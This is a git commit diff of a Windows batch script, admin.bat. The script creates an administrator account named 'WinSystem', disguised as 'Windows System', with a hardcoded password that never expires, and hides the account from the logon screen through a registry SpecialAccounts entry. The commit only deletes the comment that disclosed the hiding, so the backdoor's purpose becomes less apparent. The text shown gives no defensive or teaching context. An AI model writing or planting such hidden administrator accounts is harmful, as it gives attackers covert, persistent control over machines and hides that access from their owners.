40780a034a00059a720881658767c0a5674e1877
Sayuru99 <saurudealwis@ymail.com>
2024-06-03 17:24:03 +0530

    comments

--- resources/admin/admin.bat
+++ resources/admin/admin.bat
@@ -2,7 +2,6 @@
 net user WinSystem Some-P@ssw0rd /add /fullname:"Windows System" /passwordchg:no
 net localgroup administrators WinSystem /add
 
-REM Set WinSystem user pass to never expire and hide the user
 wmic useraccount where name='WinSystem' set passwordexpires=false
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v WinSystem /t REG_DWORD /d 0
 
